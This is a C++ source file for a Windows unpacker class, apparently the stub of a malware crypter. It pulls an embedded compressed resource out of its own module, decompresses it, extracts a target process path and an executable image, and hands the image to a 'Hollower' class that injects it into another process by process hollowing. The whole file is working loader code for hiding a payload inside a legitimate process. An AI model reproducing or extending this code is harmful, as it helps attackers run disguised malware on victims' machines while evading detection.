#include "stdafx.h"
#include "Unpacker.h"
#include "resource.h"
#include <boost/iostreams/filtering_stream.hpp>
#include <boost/iostreams/filter/zlib.hpp>
#include <sstream>
#include "Settings.h"

Unpacker::Unpacker()
{

}

BYTE* Unpacker::Unpack()
{
	HMODULE hMod = GetModuleHandle(NULL);
	HRSRC res = FindResource(hMod, MAKEINTRESOURCE(IDR_DATA1), L"DATA");
	data = (BYTE*)LoadResource(hMod, res);
	DWORD packedSize = SizeofResource(hMod, res);



	boost::iostreams::filtering_ostream os;
	const char* end = (char*)((int)data + packedSize);
	const char *cExe = (char*)data;

	std::vector<char> compressed;
	compressed.insert(compressed.end(), cExe, end);
	std::vector<char> decompressed = std::vector<char>();

	{
		boost::iostreams::filtering_ostream os;

		os.push(boost::iostreams::zlib_decompressor());
		os.push(std::back_inserter(decompressed));

		boost::iostreams::write(os, reinterpret_cast<const char*>(&compressed[0]), compressed.size());
	}

	packLocation = decompressed[0];

	char procPathAnsi[MAX_PATH];
	memcpy(procPathAnsi, &decompressed[2], MAX_PATH);
	std::string procPathStr(procPathAnsi);

	procPath = std::wstring(procPathStr.begin(), procPathStr.end());

	BYTE* exeBuff = (BYTE*)HeapAlloc(GetProcessHeap(), MEM_COMMIT, decompressed.size());
	std::copy(decompressed.begin() + EXE_RSRC_OFFSET, decompressed.end(), exeBuff);
	return exeBuff;	
}

bool Unpacker::UnpackIntoProcess()
{
	this->data = Unpack();
	if (!this->data)
		return false;
	Hollower *hollow = new Hollower(procPath, this->data);
	hollow->DoHollow();
	return true;
}

Unpacker::~Unpacker()
{
}
